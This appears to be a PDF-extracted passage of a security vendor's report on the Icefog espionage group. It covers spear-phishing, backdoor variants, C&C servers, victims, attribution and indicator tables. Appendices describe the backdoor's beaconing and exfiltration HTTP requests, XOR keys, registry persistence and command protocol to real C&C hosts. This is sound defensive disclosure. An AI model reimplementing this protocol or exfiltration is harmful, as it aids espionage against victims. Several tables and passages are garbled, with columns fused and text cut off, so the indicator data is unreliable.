of what version operating systems they are attacking.In very conservative terms, this implementation of HLP files is not an “exploit”, but instead, abuse
of a poorly constructed Windows Help feature.Code and data is mixed in this file format, and the
Icefog attackers abused it with custom macros.<footer>10</footer>

<header>Attack Analysis</header>



This sample uses standard Win32 API to allocate memory with the execution flag set, copies(using
long string copy) XOR’ed “shellcode” and calls CreateThread to transfer execution to the malicious
payload.<figure></figure>

                                                                                                 	
  

In the screenshot above, “RR” means RegisterRoutine.After registration, one can simply call the respective function.<figure></figure>

                                                                                                     	
  
Next, the sample allocates memory with execution flag , and copies XOR’ed “shellcode” .These are document files
used by the Hangul Word Processor.According to Wikipedia, Hangul (also known as Hangul Word
Processor or HWP) is a proprietary word processing application (link to: http://en.wikipedia.org/
wiki/Hangul_(word_processor)) published by the South Korean company Hancom Inc.It is used
extensively in South Korea, especially in the government sector.Unfortunately, we were not able to obtain any of these files, although they were used to successfully
attack and infect victims.Users of HWP should be aware of these exploits and update their Hangul Word Processor installation
to the most recent version.</section>

<section>
  <heading>ATTACKERS’ “MODUS OPERANDI”</heading>

The attack is initiated through spear-phishing e-mails, taking advantage of multiple known (already
patched) vulnerabilities.Once they successfully infect a machine, the operators perform several
basic functions to identify and confirm the nature of the victim:

  >>List folders on disk such as “My Documents” and the Desktop.>>List adapters and IP configurations.>>Get information about the victim and their network.If the victims looks “genuine” (they avoid working with virtual machines and “fake” victims) they
further deploy additional software, including:

  >>Type “2” backdoors that use a newer protocol for communication.>>Lateral movement tools such as:

         • Password and hash dumping tools.• Tools to dump Internet Explorer saved passwords.• Tools to dump Outlook e-mail accounts and passwords.• Debugging tools.<footer>12</footer>

<header>Attack Analysis</header>


        • The legitimate “RAR” program to compress stolen data.We have documented three main types of stolen data:

  >>Windows address books, .WAB files.>>Documents, including HWP, XLS and DOC files.>>User account credentials.If stolen information represents large files, they are compressed with the popular tool WinRAR (split
into volumes) or CABARC and transferred to the command-and-control part by part.</section>
<section>
  <heading>BACKDOOR INFORMATION</heading>

Several known variants of the Icefog backdoor are known to exist.We list these as following:

  >>The “old” 2011 Icefog — which sends stolen data by e-mail; this version was used against
    the Japanese House of Representatives and the House of Councillors in 2011.>>Type “1” “normal” Icefog — which interacts with command-and-control servers.>>Type “2” Icefog — which interacts with a script-based proxy server that redirects commands
    from the attackers to another machine.>>Type “3” Icefog — We don’t have a sample of this variant but we observed a certain kind of
    C&C that uses a different communication method; we suspect there are victims infected
    with this malware.>>Type “4” Icefog — same situation as “type 3”.>>Icefog-NG — which communicates by direct TCP connection to port 5600.</section>


<footer>13</footer>
                                                                                  
<header>ATTACK ANALYSIS</header>

<section>
  <heading>THE OLD “2011” ICEFOG</heading>

Back in 2011, we analyzed malware samples that were used to attack several Japanese
organizations.Among of the attacked organizations were the Japanese “House of Representatives”
and the “House of Councilors”.<table>

                   MD5                         COMPILEDON                 KASPERSKY NAME
 6d3d95137ef1ba5c6e15a4a95de8a546          2011-08-05 16:44:30     Trojan-Spy.Win32.Agent.bxeo
 a72d3774d2d97a7eeb164c6c5768f52a          2011-07-22 20:54:16     Trojan-PSW.Win32.MailStealer.j
 </table>

Both samples beacon out to the C&C at “www.cloudsbit.com”, although to different scripts: “/dj/
upload.aspx” and “/jd2web/upload.aspx”.In addition to the normal command-and-control mechanism, these older samples feature another
capability, which involves e-mail accounts on AOL.COM:

       harrypottercommand001@aol.com
       jd2command092@aol.com
       jd2clientsend@aol.com
       woshihero009@aol.com
       mrmylcmd009@aol.com
       defaultmail002@aol.com

The malware has the ability to connect to these accounts by POP3 and fetch commands from
the mailbox.It also has the ability to send stolen data by e-mail, by contacting smtp.aol.com and
sending e-mail messages directly.<figure></figure>


                                                                                                    	
  
<footer>15</footer>
                                                                                         
<header>ATTACK ANALYSIS</header>



Interestingly, their address book contained a number of e-mail addresses to which e-mails were
forwarded and were automatically added to the address book.<figure></figure>


                                                                                               	
  

<box>
Note: More information about the attackers and the older “2011” Icefog incident is available in our
private report.</box>
</section>
<section>
<heading>TYPE “1” ICEFOG</heading>
 <table>                                          

                         MD5                        COMPILEDON                  KASPERSKY NAME
 2a106c694660891e0950493e3eedc42d 2013-06-19 12:43:17                    Trojan-Downloader.Win32.Agent.yium
</table>                                                                         

The Icefog type “1” backdoor is a remotely controlled Trojan that supports a variety of functions.Versions of this backdoor are available for Microsoft Windows and Mac OS X.It has the ability to:

  >>Hijack and upload basic system information to C&C servers owned and controlled by the
     attackers.>>Give the attackers access to push and run commands on the infected system.>>Steal and upload files from the victims to the command-and-control servers.>>Download files (tools) from the C&C servers to the infected computers.>>Give access to the attackers to directly execute SQL commands on any MSSQL servers in
     the network.For a technical description of the type “1” Icefog backdoor, see Appendix B.</section>


<footer>16</footer>

<header>Attack Analysis</header>

<section>
  <heading>TYPE “2” ICEFOG</heading>

The type “2” Icefog backdoor is very similar to type 1.However it uses a proxy server for the
commands.This behavior relies on a set of ASP scripts, which act as a buffer between the real C&C
backend and the victim.It offers another level of anonymity to the attackers, as it can be controlled
(for instance) via Tor or another anonymizing method.We haven’t observed the use of Type “2” backdoors directly against the victims.Instead, the type
“2” backdoor is used as an upgrade to Type “1” infections, together with a special loader tool.It uses a script named “alive.asp” for most of the operations.(example C&C URL: www.chinauswatch[dot]net/test/space.asp - SINKHOLED by Kaspersky
Lab).<figure></figure>

<caption>Icefog Type “2” C&C scripts</caption>




<footer>17</footer>
                                                                                         
<header>ATTACK ANALYSIS</header>



Type “2” Icefog exists as shellcode files, usually named “msuc.dat”.These are loaded through the
use of a special tool.The only difference is that the malware
does not have persistence in the system and disappears after reboot.</section>

<section>
  <heading>TYPE “3” AND “4” ICEFOG</heading>

Although we don’t have samples of these variants, we observed and sinkholed a certain kind of
Icefog-related command-and-controls that use a different communication method; we suspect
there are victims that are infected with this malware.Type “3” Icefog uses scripts named “view.asp” and “update.asp”.Known C&C URLs:


      www.krentertainly[dot]net/web/view.asp
      disneyland.website.iiswan[dot]com/web/view.asp


Type “4” Icefog uses scripts named “upfile.asp”.Known C&C URL:


      www.pinganw[dot]org/sugers/upfile.asp - SINKHOLED by Kaspersky Lab)



<footer>18</footer>

<header>Attack Analysis</header>



We continue to look for these variants and will update the paper when or if they are identified.</section>
<section>
  <heading>TYPE “NG” ICEFOG</heading>

Type “NG” Icefog is the most recent version of this backdoor.It is designed to communicate directly
with a command-and-control software that runs on Microsoft Windows computers.For a thorough technical description of the type “1” Icefog backdoor, see Appendix C.
</section>

<section>
  <heading>MACFOG - THE MAC OS X VERSION OF ICEFOG</heading>

In late 2012, the Icefog attackers experimented with a Mac OS X version of Icefog.This particular
version of the malware was seeded in a number of Chinese BBS forums and masked as a graphic
application.Here is an example: http://bbs.pcbeta.com/forum.php?mod=viewthread&tid=1157944
&page=1#pid30109870


On 19 October 2012, the user “appstoer” advertised an application named “Img2icns.rar”.<figure></figure>

                                                                                        	
  

The archive contains a Mac OS X application that drops and installs the Macfog malware.We were
able to find two such archives, but there are probably more.It uses the type “1” C&C servers protocol to communicate and has the same capabilities
as the Windows version.We are including a brief description below; a full description of the malware
is available in Appendix D:


                                MACFOG: SUMMARY DESCRIPTION


The Macfog backdoor is very similar to its Win32 siblings.<figure></figure>
                                                                                                    	
 <caption>Macfog C&C configuration data</caption>


The Macfog backdoor is different from the Windows variant from the point of view of usage by the
attackers.So far, we haven’t identified victims of targeted attacks being infected with it, although
we do believe they exist.The seeding of this version through Chinese bulletin boards resulted in a
few hundred infections worldwide.We believe this could have been a beta-testing phase for Mac
OS X versions to be used in targeted attacks later.</section>


<footer>21</footer>
                                                                                      
<header>ATTACK ANALYSIS</header>


<section>
  <heading>LATERAL MOVEMENT TOOLS:</heading>

The attackers rely on a multitude of lateral movement tools that are deployed to the victims through
the command-and-control servers.The tools we observed cover a variety of functions, such as
dumping Windows user credentials, Outlook and Internet Explorer saved passwords, and the
gathering of system information.jpg (“Undercurrent
                                            server code piece
                                            calling program”)
 be043b0d1337f85cfd05f786eaf4f942           通信模块代码片               Loader for type “2” Icefog
                                            调用专用.exe.jpg
                                            (“Communication
                                            module code sheet
                                            invoking special.Exe.jpg”)
 95ee545a6562a81c3e049a48c5b9f8aa           freespi.cab.cab       Small tool which lists and deletes
                                                                  Winsock providers.Icefog uses
                                                                  Winsock providers for persistence,
                                                                  so it is used by the attackers during
                                                                  upgrade to a newer version of the
                                                                  malware.</table>
<footer>22</footer>

<header>Attack Analysis</header>



In addition to these, several other tools were observed but not recovered.For instance, on one of
the victim machines, we observed what appeared to be the use of a Kernel exploit through a Java
application for escalation of privileges.Unfortunately, we do not know if it was a zero-day kernel
vulnerability because the file was deleted by the attackers after being used.</section>


<footer>23</footer>
                                                               
<header>COMMAND AND CONTROL SERVERS</header>



<section>
  <heading>►►COMMAND AND CONTROL
     SERVERS</heading>
During our research, we observed multiple Icefog command and control servers.Most of them
were on shared hosting platforms, however, some of them, which were of greater importance to the
attackers, were also using dedicated hosting.Perhaps one of the most important aspects
of the Icefog C&Cs is the “hit and run” nature.The attackers would set up a C&C, create a
malware sample that uses it, attack the victim,
infect it, and communicate with the victim
machine before moving on.The shared hosting
would expire in a month or two and the C&C
disappears.The nature of the attacks was also very focused
- in many cases, the attackers already knew
what they were looking for.The filenames were
quickly identified, archived, transferred to the
C&C and then the victim was abandoned.Based on the C&C names, we were able to
identify several Icefog campaigns that were
active between 2011-2013.From the timeline above, it seems the attackers
increased the number of campaigns in 2013
compared to previous years, although it’s
possible that malware and artifacts used in
earlier years are no longer available.Hence, the
chart probably represents only a fraction of the
attackers’ activity during the past years.<figure></figure>
</section>
<footer>24</footer>

<header>Command and Control servers</header>

<section>

  <heading>C&C SERVERS INFRASTRUCTURE</heading>

We identified four types of Icefog C&C servers - type “1”, “2”, “3” and type “4”.Also, there is a fifth,
standalone type of C&C, used for Icefog-NG, which runs as a Windows desktop application.The type “1” C&C server uses a full web backend that lets the attacker directly control the victims
via a web browser.The type “1” C2 backend is written in ASP.NET.The type “2” C&C server backend we identified acts as a virtual, custom proxy between the attackers
and the victims.It is written in ASP and is extremely simplistic in operation.This is more effective as
it conceals the attacker’s identity.The second type of C2 works in conjunction with a control tool,
probably running directly on the attacker’s PC.The type “3” C&C server (used in the “starwings” and “disneyland” campaigns) appears to be
experimental and features only two basic functions: view and update.Its exact workings are unknown
and we haven’t been able to locate the Icefog malware that uses it.The type “4” C&C server was identified through sinkholing of the domain “pinganw[dot]org”.(known
C2 URL - www.pinganw[dot]org/sugers/upfile.asp).Just like type “3”, the exact workings are
unknown and we haven’t been able to locate the Icefog malware that uses it.The Icefog-NG C&C server is a Windows desktop application which doesn’t require a web server and
works as a standalone TCP server, which by default listens on port 5600.Our analysis focuses on type “1” C&C servers, which are the most popular and have been used in
most of the attacks we observed.<footer>25</footer>
                                                                      
<header>COMMAND AND CONTROL SERVERS</header>



Here’s a look at the type “1” command-and-control server login screen:


<figure></figure>

                                                                                                        	
  
The command-and-control script (“control.aspx”) features an interesting comment
“shiyanlllllllllllllllllllllllllll”.The page title is “尖刀三号”, which means “Dagger Three” in Chinese.<figure></figure>

                                                                                                        	
  

<footer>26</footer>

<header>Command and Control servers</header>



For martial arts fans, the “尖刀三号” is quite similar to “三尖刀”, which is an ancient Chinese weapon.Below is short description of directories used by the C&C application:
<table>

 ok:                               “heartbeat” files with dates that indicate the last time a victim
                                   was online.downloads:                        files that were transferred from the victim at the request of the
                                   operator.uploads:                          files that should be pushed to the victim systems.order:                            files containing instructions or commands that are to be
                                   executed on the victims’ machines.result:                           The result of command execution on the victims’ machines.info:                             basic information about the victims’ systems.logs:                             operator interaction logs, can be erased on request by the
                                   operator.files:                            additional files, including JavaScript, CSS and images used by
                                   Control Panel web user interface.</table>

Perhaps the most interesting part is that the type “1” C&C panel maintains a full history of the
attacker’s interaction with the victims.This is kept as an encrypted logfile, in the “logs” directory
on the server.In addition to that, the server maintains full interaction logs and command execution
results from each victim.We believe that Icefog-NG was
 developed by the same author to replace Icefog bot and the web-based Control Panels.<figure></figure>

<caption>Icefog-NG File Control tab</caption>




<footer>30</footer>

<header>Command and Control servers</header>



Icefog-NG was designed to be more responsive and convenient to the operator.The data storage is
the same - local filesystem, and even the file names are the same as on the previous Icefog version.Here is a screenshot of the user interface from the Icefog-NG C&C application.<figure></figure>

<caption>Icefog-NG login prompt</caption>

Like with the web-based Icefog, this C&C application requires authorization of the operator.While
in the web version it made sense to authenticate remote users to restrict access to the Control
Panel, the desktop application authentication is easily bypassed, because the login and password
are hardcoded in the binary.Here’s a look at the “victims” panel in the Icefog-NG C&C software:


<figure></figure>

<caption>Icefog-NG UI layout optimized for a screen resolution of 1280x1024</caption>


<footer>31</footer>
                                                                
<header>COMMAND AND CONTROL SERVERS</header>



One curious fact about Icefog-NG is that it is usable only if you have screen resolution set at
1280x1024 or higher.Even on standard 1024x768, not all controls fit into screen.The application
was created using Microsoft Visual Studio MFC AppWizard.Although, the sample we analyzed
was compiled in May 2013, the project was most likely started in 2012, which is stated in the
“About Application” message box.This date is put automatically by the AppWizard when the code
is generated for the first time.</section>


<footer>32</footer>

<header>Infection data and statistics</header>


<section>

  <heading>►►INFECTION DATA AND
  STATISTICS</heading>
The command-and-control servers maintain full logs of the victims together with the various
operations performed on them by the C&C operators.These logs are encrypted with a simple XOR
operation and available to anyone who knows their location and name on the server.Here’s what a
decoded log looks like:



<figure></figure>
                                                                                                   	
 <caption>Sample C&C activity log</caption>

These logs can sometimes help to identify the targets of the attacks and in some cases, the victims.During our research, we observed attacks against a number of targets in South Korea, Taiwan
and Japan.These include defense industry contractors such as Lig Nex1 and Selectron Industrial
Company, shipbuilding companies such as DSME Tech, Hanjin Heavy Industries, telecom operators
such as Korea Telecom, media companies such as Fuji TV and the Japan-China Economic Association.Overall, during the monitoring period, we observed connections from several victims, based in South
Korea, Japan, Taiwan, Germany and some other countries.<footer>34</footer>

<header>Infection data and statistics</header>



For Windows based computers, we have the following statistics:

<figure></figure>

<caption>Distribution by number of hits in our sinkhole (percentage)</caption>


<figure></figure>
  <caption>Distribution by number of hits in our sinkhole (absolute values)</caption>




<footer>35</footer>
                                                            
<header>INFECTION DATA AND STATISTICS</header>

.<footer>37</footer>
                                                                     
<header>INFECTION DATA AND STATISTICS</header>



For Windows-based machines, our sinkhole received connections from almost 200 unique IPs, in
six countries.It should be noted that in terms of the overall picture, these sinkholed domains offer a view of only
a fraction of the infected computers, especially old infections which for some reason have not yet
been disinfected.The newer attacks are more difficult to track because they use new C&C domains
that can’t be easily sinkholed.Another important note relates to geographical distribution of victims.While we see many
connections coming from China, this doesn’t mean that it has victims of targeted attacks.Because
the Macfog samples that we have seen are being distributed in a trojanized bundle with legitimate
software on publicly available Chinese message boards, visitors (especially those who read Chinese)
from any country in the world could get infected.We believe that a primary goal of doing that was
to test malware in different environments and evaluate its efficiency.That explains why the domain
used as C2 was abandoned - random victims had less value for the attackers.Based on the more reliable analysis of the C&C servers used in the targeted attacks, spearphishing
examples and other data collected during our research, we believe that the primary targets of the
Icefog operations were in South Korea and Japan.</section>


<footer>38</footer>

<header>Attribution</header>


<section>

 <heading> ►►ATTRIBUTION</heading>
  <heading>AT TACKER IPS</heading>

Based on the list of IPs used to monitor and control the infrastructure, we assume some of the threat
actors behind this operation are based in at least three countries:

  >>China (the largest number of connections)

  >>South Korea

  >>Japan

More information on attribution is available in our private report for governments.(Contact
intelreports@kaspersky.com)

</section>
<section>
    <heading>MALWARE ARTIFACTS</heading>

The “MSUC.DAT” type “2” backdoor has an ASCII string inside with the following content: “Yang.ZC
Wang.GS Zhan.QP Ma.J Li.X Hu.HXU”.<figure></figure>

  <caption>Icefog Type “2” hardcoded names</caption>




<footer>39</footer>
                                                                                  
<header>ATTRIBUTION</header>



The Icefog Type “2” backdoor loader with MD5 “be043b0d1337f85cfd05f786eaf4f942”, found
on the C2 domain “infostaition.com” has the following debug path inside:


“C:\Users\yang.zc\Desktop\代码片调用程序 4\Release\UCCodePieceGo.pdb”


Note that “Yang.zc” appears in both strings.The string “代码片调用程序 4” translates to “Piece of
code calling 4” from Chinese.</section>
<section>
    <heading>LANGUAGE USAGE</heading>

One of the C&C backend control scripts (control.aspx) has the page title “尖刀三号”, which means
“Dagger Three” in Simplified Chinese.These IPs are
known to point to dedicated hosting servers.*
</list>
</section>


<footer>48</footer>

<header>Conclusions</header>


<section>

  <heading>►►CONCLUSIONS</heading>
This paper describes “Icefog”, a small APT group which focuses on targets in South Korea and
Japan.The operation appears to have started in 2011 and increased in size and scope during each
year.Based on the victim profiles, the attackers appear to have an interest in the following sectors:
<list>
  >>Military

  >>Mass media and TV

  >>Shipbuilding and maritime operations

  >>Computers and software development

  >>Research companies

  >>Telecom operators

  >>Satellite operators
</list>
Despite their relative lack of complexity, the attackers have successfully compromised targets
belonging to these categories, with the largest number of victims being in South Korea.The Icefog attackers have both Windows and Mac OS X backdoors at their disposal.The Mac OS
X backdoor currently remains largely undetected by security solutions and has managed to infect
several hundred victims worldwide.The “hit and run” nature of this operation is one of the things that make it unusual.While in other
cases, victims remain infected for months or even years, and data is continuously exfiltrated, the
Icefog attackers appear to know very well what they need from the victims.Once the information is
obtained, the victim is abandoned.During the past years, we observed a large increase in the number of APTs which are hitting pretty
much all types of victims and sectors.In turn, this is coupled with an increased focus on sensitive
information and corporate cyber-espionage.In the future, we predict the number of small, focused APT-to-hire groups to grow, specializing in



<footer>49</footer>
                                                                                      
<header>CONCLUSIONS</header>



hit-and-run operations, a kind of “cyber mercenaries” of the modern world.Recommendations on how to stay safe from such attacks (for both Windows and Mac OS X users):

  >>Update Java to the most recent version or, if you don’t use Java, uninstall it.>>Update Microsoft Windows and Microsoft Office to the latest versions.>>Update all other third party software, such as Adobe Reader.>>Be wary of clicking on links and opening attachments from unknown persons.>>Windows users can install Microsoft EMET 4.0, a toolkit designed to help prevent hackers
     from gaining access to your system.So far, we haven’t observed the use of zero-day vulnerabilities by the Icefog group; to defend
against those, although patches don’t help, technologies such as AEP (Automatic Exploit
Prevention) and DefaultDeny can be quite effective.gen
 eb4579f08cd270e496c70ddcaa29dacb   “CS130116-2 BARILOCHE(    Exploit.OLE2.Multigeneric.ユニバーサル舞鶴 057) MSB.gen
                                    XLS”
 5aaa057d3447a214e729276563d2f922   打ち合わせ議事録(130204).Exploit.MSWord.CVE-2012-
                                    xls                       0158.az

</table>
</section>
<section>

                      <heading>DROPPERS</heading>
<table>                      

                                                     KASPERSKY
               MD5                  COMPILEDON                                C2
                                                       NAME
 8f816f4acc49f5ebba00d92437b42e85 2013-01-15      Trojan-            asdfghjk.host2.5y6.10:51:17        Downloader.15:22:58      Downloader.com/jd/upload.Win32.Agent.vkcs    aspx
3a6feab7eb90b87cf5a4e08bce2572e8   2012-06-04    Trojan-             www.kechospital.15:22:56      Downloader.com/jd/upload.Win32.Agent.vkcs    aspx
853096b7e1e4bdb9221875c30d9a15a0 2012-07-03      Trojan-             mail.kechospital.22:46:52        Downloader.com/jd/upload.Win32.Agent.wpuu    aspx
2a106c694660891e0950493e3eedc42d 2013-06-19      Trojan-             fruitloop.8.100911.09:43:17        Downloader.com/news/upload.Win32.Agent.yium    aspx
6d3d95137ef1ba5c6e15a4a95de8a546   2011-08-05    Trojan-Spy.Win32.www.cloudsbit.13:44:30      Agent.bxeo          com/jd2web/
                                                                     upload.aspx
15a342cf2cc4fc5ae933d463f5d2196f   2011-08-05    Trojan-Spy.Win32.www.cloudsbit.08:46:17      Agent.bxeo          com/ko/upload.aspx
acc57cc72a8d129703b4914c408a15a1   2011-03-16    Trojan-             www.cloudsbit.10:44:18      Downloader.com/tt/upload.aspx
                                                 Win32.Agent.tenl
162b349be9c6d11c58cf163e211d891c   2011-07-22    Trojan-             www.cloudsbit.02:51:45      Downloader.com/jian3/upload.Win32.Agent.swbo    aspx
f7547f23bd2fd37b7d44e8617f629b49   2011-06-15    Trojan-             www.cloudsbit.02:24:07      Downloader.com/hh/upload.Win32.Agent.gxmp    aspx
c352c376968e8a1157fa425431776797   2013-01-16    Trojan-             www.9-joy.net/jd/
                                   16:51:32      Downloader.upload.aspx
                                                 Win32.Agent.wqqz
31a530fea411455b8844fe019ffb66cd   2013-01-16    Trojan-             www.9-joy.net/jd/
                                   16:51:34      Downloader.upload.aspx
                                                 Win32.Agent.wqqz
43678aa052ad677841bd2ef532ecd284   2013-06-21    Trojan-             minihouse.website.02:43:48      Downloader.iiswan.com/upload/
                                                 Win32.Agent.gznn    upload.aspx
fa452f67c6bf8056b563690d61c4a4c6   2013-06-20    Backdoor.Win32.www.kreamnnd.22:06:26      Agent.dcjj          com:5600
                                                                     (27.255.71.204)
b21635b1b1fce93ff917d9308d4835fb   2013-01-23    Trojan-             newsceekjp.com/
                                   08:30:51      Downloader.jd/upload.aspx
                                                 Win32.Agent.xsry




<footer>52</footer>

<header>Appendix A</header>




 2d6a82fdb59e38d63027beac28dc2813   2012-04-12   Trojan-            www.setchon.com/
                                    18:07:41     Downloader.jd/upload.aspx
                                                 Win32.Agent.vkcs
 beb9da03aff9386599625199a5a47b8d   2013-03-18   Trojan-            mudain.net/jd/
                                    02:17:49     Downloader.upload.aspx
                                                 Win32.Agent.xyqw
 80405f5681f1e4f2de6e8c26ec20c14d   2012-01-17   Trojan-            pinganw.org/jd/
                                    05:55:18     Downloader.upload.aspx
                                                 Win32.Agent.vigx
 2761c55bafa96d5814e847b665006e49   2012-07-17   Trojan-            199.192.154.124/
                                    18:16:19     Downloader.jd/upload.aspx
                                                 Win32.Agent.wpzp


 566b175ab355e6313ba0ca98b0146d84   2011-09-16   Trojan-            www.unikorean.02:30:13     Downloader.com/jd/upload.Win32.Agent.tlod   aspx
 d421e0d74fa7035246c1ea51bd4d3114   2013-05-03   Trojan-            electk.net/jd/
                                    03:04:49     Downloader.upload.aspx
                                                 Win32.Agent.yavh
 24751030c1fa40bd57988d4e6fe70117   2012-08-30   Trojan-            www.625tongyi.01:02:35     Downloader.com/jd/upload.Win32.Agent.wqqz   aspx
 392f5372ba3348ea1820df34c078f6c8   2013-01-08   Trojan-            www.dotaplayers.23:10:42     Downloader.com/jd/upload.Win32.Agent.xpsf   aspx
 fba7b9ffd08110e37d2bdf77c0d8b806   2013-02-04   Trojan-            40yuan.8.100911.Downloader.com/jd/upload.Win32.Agent.xrlh   aspx
 0e2694aea9d3de122611d88e37ffc7f0   2011-06-19   Trojan.Win32.www.chinauswatch.10:27:49     Icefog.d           net/test/upload.asp
 78d9ac9954516ac096992cf654caa1fc   2012-07-26   Trojan-            www.setchon.com/
                                    03:10:51     Downloader.jd/upload.aspx
                                                 Win32.Agent.gzda
 387ae1e56fa48ec50a46394cc51acce7   2012-07-26   Trojan-            www.setchon.com/
                                    03:10:48     Downloader.jd/upload.aspx
                                                 Win32.Agent.xsub
 cd85a9a05538e89190d519703c9a1327 2012-10-16     Trojan.Win32.www.samyongonc.19:41:52       Icefog.b           com/jd/upload.aspx
 f46eb126668dfc843a05958e71936b01   2011-09-23   Trojan.Win32.The module
installs at %WinDir%\wdmaud.drv and is automatically loaded by explorer.exe on startup.This
technique is known as “DLL search order hijacking”, and abuses the fact that Windows Explorer will
load this file from its own directory first, instead of the Windows SYSTEM folder.It communicates with the C&C server at ‘icefog.8.100911.com’ (211.42.249.39) and passes
collected information about victim, lets the operator download or upload files to and from the victim
machines, execute system commands on the infected machines as well as execute additional
malware components.</section>

<section>
  <heading>DETAILED DESCRIPTION</heading>

After the DLL is loaded, it creates system mutex named “myhorse_macfee”.If such mutex already
exists, the module quits to avoid duplicate instances from running.After that, it loads %WinDir%\wdmaud.drv (this DRV is loaded by explorer.exe on startup) and
calls exported mymainfunc of its own module that creates a new thread responsible for the
communication with C&C.The spawned thread collects information about the system such as user names, machine names,
IP addresses, running processes, proxy settings, Windows versions, etc.It produces a report that



<footer>54</footer>

<header>Appendix B</header>



is later submitted to the C&C server.An example for such a report is shown below:
<list>
  Hostname: <SYSTEM NAME>
  IP: <SYSTEM LOCAL IP ADDRESS>
  Proxy: <LOCAL PROXY SERVER>
  User: <USERNAME>
  SystemDir: C:\WINDOWS\system32
  OS Language Version: <OS LANGUAGE ID>
  System Version: <OS VERSION>
  Process:
  ID: 4 (?)ID: 552 (\SystemRoot\System32\smss.exe)
  ...
  (List all running processes and their main executable file path)

</list>
This information is then written to the file at %TMP%\tmp.dat.Then, it checks if the %TMP%\msuc.dat file exists.If it exists, the module creates a new thread
that will load the file contents into memory and pass execution flow to the first byte of the loaded
data in memory.The contents of the tmp.dat is converted to wide char and XORed with key “*&~^%@0hh8979”.Immediately after, it is sent via HTTP/1.1 POST request to ‘icefog.8.100911.com’ on port 80.The full query string is the following:
<list>
  ‘/news/upload.aspx?filepath=info&filename=<HOSTNAME>_<HOSTIP>.jpg’.The response is saved to file %TMP% \order.dat


The content of order.dat is converted from widechar to multibyte string and is parsed for the following
command strings:
<list>
  >>cmd_

  >>upload_

  >>download_

  >>code_
</list>

If any of the commands above is found, the Trojan notifies the C&C that the command was received
by issuing the following POST request:
<list>
  Query string: ‘/news/upload.It creates a new process with command
line C:\windows\system32\cmd.exe /c <COMMAND>


However, if <COMMAND> contains output redirection character “>”, the executed command line
will be as following:
<list>

C:\windows\system32\cmd.exe /c command > %TMP%\ cmd1.dat.</list>

After the process has finished its stdout output is sent to the C&C via
<list>
  POST request to ‘/news/upload.aspx?filepath=result&filename=<HOSTNAME>_<HOSTIP>.jpg’


  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache
</list>
The command-line output is converted to wide-char string and XORed using “*&~^%@0hh8979”
string as the key.</section>

<section>
    <heading>COMMAND UPLOAD_</heading>

The command string format must be as following: upload_<FILEPATH>_<FILENAME>


It attempts to fetch icefog.8.100911.com/news/order/<FILENAME> using user agent mydownload
and saves the response to the local path specified in <FILEPATH>.The result is saved to
%TMP%\tmpxor.dat’


The tmpxor.dat is uploaded via POST request to ‘icefog.8.100911.com’ at port 80.<list>
  Query string: ‘/news/upload.aspx?filepath=download&filename=<HOSTNAME>_
  <HOSTIP>_<NAMEONSERVER>_<FILESIZE>.jpg’.</section>

<section>
  <heading>NO COMMAND</heading>

If no known command is parsed out of the server response, the Trojan notifies the server about
being alive by issuing the following HTTP POST request:
<list>
  Query string: ‘/news/upload.aspx?filepath=ok&filename=<HOSTNAME>_<HOSTIP>.jpg’
  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache.</list>
After that it sleeps for 150 seconds and starts the command-processing loop again.For reference, we called it Icefog-NG (New Generation).We believe that the new generation
of Icefog was created to improve bot response and to increase the efficiency of operations.The
previous web-based version of the bot had significant time lag during operation (up to 40 seconds),
the new generation bot was created to solve the time lag issue.<table>
                     MD5                              SIZE             COMPILEDON
 FA452F67C6BF8056B563690D61C4A4C6               86’016            2013-06-21 01:06:26
</table>
</section>

<section>
  <heading>SUMMARY</heading>


The module is a non-packed Win32 PE Executable file compiled in Microsoft Visual C++ 2005.It
is a backdoor that is capable of collecting system information, download and upload files, execute
commands.</section>
<section>
  <heading>DETAILED DESCRIPTION</heading>

To enable automatic start during system boot, the malware adds and uses the following system
registry value:
  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load=”%TMP%\msloger.exe”


During start it checks if a file named “%TMP%\~AA.tmp” exists.If yes, it copies the file to %TMP%\
hwp.hwp.Next it kills processes named “hwp.exe” and then opens “hwp.hwp”.This is important
step during first malware run which opens a decoy .hwp document.This shows that the malware
was designed to be installed from .hwp documents containing exploits.<footer>60</footer>

<header>Appendix C</header>



Then it copies “%TMP%\~Ab.tmp” to “%TMP%\msloger.exe”.After that the malware registers on the C&C.To do that, the malware connects to www.kreamnnd.com on port 5600 and sends a registration message

  [Total message size: DWORD]SX[HOSTID length:WORD][HOSTID][Host Info Data
  Size: DWORD][Host Info Data]

HOSTID is a string having system hostname and system IP joined by “_”: Hostname_IP.The data is encrypted using XOR with key “&*^*@~^%9?i0h”.If the connection with C&C is lost the
bot can re-establish the session by sending

  [Total message size: DWORD]XT[Hostname length:WORD][HOSTNAME]_[IPADDR]
</section>
<section>
    <heading>CONTROL COMMANDS</heading>

After connecting to the C&C and sending the registration message the bot expects commands from
the server.These commands are described below.</section>
<section>
    <heading>COMMAND CMD</heading>

This command is used to execute a command line.The message has the following format:

  [Total Message Size: DWORD]SC[COMMAND]

The bot checks if the COMMAND contains “sleep” then it sleeps for the specified time after “sleep”
substring.Otherwise, a new cmd.exe processes is spawned to execute the COMMAND.If the command does
not contain “>” the output will be directed to %TMP%\cmd1.dat and the result will be sent to the
C&C automatically using the following format:

  [Total Message Size: DWORD][cmd1.dat data]

The %TMP%\cmd1.dat is deleted after the file is sent to the C&C.</section>


<footer>61</footer>
                                                                                         
<header>APPENDIX C</header>
<section>

  <heading>COMMAND DOWNLOAD</heading>

This command is used to download a file from the victim machine.The message has the following
format:

  [Total Message Size: DWORD]DL[FILEPATH]

The server expects the bot to send a response message with the file size from victim bot	

  [Total Message Size: DWORD]OK[File Size: DWORD]

Then the server sends an acknowledgement message to the victim bot

  [Total Message Size: DWORD]OK

The bot encrypts the contents of the file and saves it to %TMP%\mstmpdata.dat.After that part it
sends mstmpdata.dat file split in chunks of 0x4ffc each (the last one may be shorter than 0x4ffc).Here is the format of that message:

  [Total Message Size: DWORD][File data no longer than 0x4ffc]

The last message is repeated containing the next chunk of the file until end of file is reached.</section>
<section>
